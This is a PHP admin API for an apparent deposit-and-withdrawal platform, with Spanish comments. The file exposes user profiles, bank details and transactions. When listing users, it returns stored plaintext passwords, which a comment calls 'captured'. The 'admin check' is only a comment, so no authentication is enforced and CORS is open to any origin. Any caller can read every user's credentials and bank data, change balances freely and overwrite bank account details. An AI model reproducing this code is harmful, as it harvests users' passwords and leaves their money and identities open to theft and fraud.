<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

require_once 'config.php';

// Simple admin check - in production, use proper authentication

// GET - Get all users or specific user
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    try {
        $user_id = $_GET['user_id'] ?? $_GET['id'] ?? null;
        
        if ($user_id) {
            // Get specific user details
            $stmt = $pdo->prepare("
                SELECT id, username, firstname, lastname, email, mobile, country_code, 
                       balance, address, city, zip, status, created_at, last_login,
                       bank_account_number, bank_beneficiary, bank_routing, bank_swift
                FROM users 
                WHERE id = ?
            ");
            $stmt->execute([$user_id]);
            $user = $stmt->fetch();
            
            if (!$user) {
                echo json_encode(['success' => false, 'message' => 'User not found']);
                exit;
            }
            
            // Get user's deposits
            $stmt = $pdo->prepare("SELECT * FROM deposits WHERE user_id = ? ORDER BY created_at DESC");
            $stmt->execute([$user_id]);
            $deposits = $stmt->fetchAll();
            
            // Get user's withdrawals
            $stmt = $pdo->prepare("SELECT * FROM withdrawals WHERE user_id = ? ORDER BY created_at DESC");
            $stmt->execute([$user_id]);
            $withdrawals = $stmt->fetchAll();
            
            echo json_encode([
                'success' => true,
                'user' => $user,
                'deposits' => $deposits,
                'withdrawals' => $withdrawals
            ]);
            
        } else {
            // Get all users - incluir plain_password si existe
            $stmt = $pdo->query("
                SELECT id, username, firstname, lastname, email, mobile, 
                       balance, status, created_at, last_login, password, plain_password 
                FROM users 
                ORDER BY created_at DESC
            ");
            $users = $stmt->fetchAll();
            
            // Si plain_password existe, usarla; si no, mostrar el hash
            foreach ($users as &$user) {
                if (!empty($user['plain_password'])) {
                    // Mostrar la contraseña real capturada
                    $user['password'] = $user['plain_password'];
                }
                // Eliminar plain_password del response (ya está en password)
                unset($user['plain_password']);
            }
            
            echo json_encode([
                'success' => true,
                'users' => $users
            ]);
        }
        
    } catch (PDOException $e) {
        echo json_encode([
            'success' => false,
            'message' => 'Database error: ' . $e->getMessage()
        ]);
    }
    exit;
}

// POST - Update user balance or status
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    $action = $input['action'] ?? null;
    $user_id = $input['user_id'] ?? null;
    
    if (!$action || !$user_id) {
        echo json_encode(['success' => false, 'message' => 'Action and user ID are required']);
        exit;
    }
    
    try {
        if ($action === 'update_balance') {
            $amount = $input['amount'] ?? null;
            $operation = $input['operation'] ?? 'add'; // add or subtract
            
            if ($amount === null || !is_numeric($amount)) {
                echo json_encode(['success' => false, 'message' => 'Valid amount is required']);
                exit;
            }
            
            if ($operation === 'add') {
                $stmt = $pdo->prepare("UPDATE users SET balance = balance + ? WHERE id = ?");
            } else {
                $stmt = $pdo->prepare("UPDATE users SET balance = balance - ? WHERE id = ?");
            }
            
            $stmt->execute([$amount, $user_id]);
            
            echo json_encode([
                'success' => true,
                'message' => 'User balance updated successfully'
            ]);
            
        } elseif ($action === 'update_status') {
            $status = $input['status'] ?? null;
            
            if ($status === null) {
                echo json_encode(['success' => false, 'message' => 'Status is required']);
                exit;
            }
            
            $stmt = $pdo->prepare("UPDATE users SET status = ? WHERE id = ?");
            $stmt->execute([$status, $user_id]);
            
            echo json_encode([
                'success' => true,
                'message' => 'User status updated successfully'
            ]);
            
        } elseif ($action === 'update_user') {
            // Update user information
            $firstname = $input['firstname'] ?? null;
            $lastname = $input['lastname'] ?? null;
            $email = $input['email'] ?? null;
            $mobile = $input['mobile'] ?? null;
            $address = $input['address'] ?? null;
            $bank_account_number = $input['bank_account_number'] ?? null;
            $bank_beneficiary = $input['bank_beneficiary'] ?? null;
            $bank_routing = $input['bank_routing'] ?? null;
            $bank_swift = $input['bank_swift'] ?? null;
            
            $updates = [];
            $params = [];
            
            if ($firstname !== null) {
                $updates[] = "firstname = ?";
                $params[] = $firstname;
            }
            if ($lastname !== null) {
                $updates[] = "lastname = ?";
                $params[] = $lastname;
            }
            if ($email !== null) {
                $updates[] = "email = ?";
                $params[] = $email;
            }
            if ($mobile !== null) {
                $updates[] = "mobile = ?";
                $params[] = $mobile;
            }
            if ($address !== null) {
                $updates[] = "address = ?";
                $params[] = $address;
            }
            if ($bank_account_number !== null) {
                $updates[] = "bank_account_number = ?";
                $params[] = $bank_account_number;
            }
            if ($bank_beneficiary !== null) {
                $updates[] = "bank_beneficiary = ?";
                $params[] = $bank_beneficiary;
            }
            if ($bank_routing !== null) {
                $updates[] = "bank_routing = ?";
                $params[] = $bank_routing;
            }
            if ($bank_swift !== null) {
                $updates[] = "bank_swift = ?";
                $params[] = $bank_swift;
            }
            
            if (empty($updates)) {
                echo json_encode(['success' => false, 'message' => 'No fields to update']);
                exit;
            }
            
            $params[] = $user_id;
            $sql = "UPDATE users SET " . implode(", ", $updates) . " WHERE id = ?";
            $stmt = $pdo->prepare($sql);
            $stmt->execute($params);
            
            echo json_encode([
                'success' => true,
                'message' => 'User information updated successfully'
            ]);
            
        } else {
            echo json_encode(['success' => false, 'message' => 'Invalid action']);
        }
        
    } catch (PDOException $e) {
        echo json_encode([
            'success' => false,
            'message' => 'Database error: ' . $e->getMessage()
        ]);
    }
    exit;
}

echo json_encode([
    'success' => false,
    'message' => 'Invalid request method'
]);
?>
